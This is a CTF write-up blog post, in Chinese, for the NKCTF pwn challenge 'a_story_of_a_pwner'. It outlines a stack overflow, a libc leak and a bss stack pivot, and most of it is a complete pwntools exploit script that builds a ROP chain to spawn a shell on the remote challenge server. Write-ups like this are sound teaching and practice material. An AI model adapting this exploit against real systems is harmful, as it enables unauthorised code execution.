---
title: nkctf_a_story_of_a_pwner
date: 2023-03-26 22:12:09
categories: 
- pwn_wp
tags: 
- pwn
- ROP
---

nkctf的a_story_of_a_pwner，大哥的故事挺有意思的，题目也挺好做的。

<!-- more -->

heart里面有栈溢出(0x20-0xa)byte

warning可以直接leak libc

先在acm,ctf,love里把ROP链写进bss段，之后栈迁移到这里gets shell

**exp:**

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('./libc.so.6')
# p=process('./'+filename)
p=remote('node.yuzhian.com.cn',36843)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def acm(content):
    ru("> \n")
    sl("1")
    ru("what's your comment?\n")
    s(content)

def ctf(content):
    ru("> \n")
    sl("2")
    ru("what's your corment?\n")
    s(content)

def love(content):
    ru("> \n")
    sl("3")
    ru("what's your corMenT?\n")
    s(content)

def heart(content):
    ru("> \n")
    sl("4")
    ru("now, come and read my heart...\n")
    s(content)

def warning():
    ru("> \n")
    sl("4")
    ru("I give it up, you can see this. ")
    data=int(ru('\n')[:-1],16)
    return data

pop_rdi_ret=0x0000000000401573
bss_addr=0x00000000004050A0
leave_ret=0x000000000040139e

puts_addr=warning()
libcbase=puts_addr-libc.sym['puts']

leak('libcbase',hex(libcbase))
sys_addr=libcbase+libc.sym['system']
binsh_addr=libcbase+libc.search(b"/bin/sh\x00").__next__()

ctf(p64(pop_rdi_ret))
acm(p64(binsh_addr))
love(p64(sys_addr))
payload=b'a'*0xa+p64(bss_addr-0x8)+p64(leave_ret)
heart(payload)

itr()
```

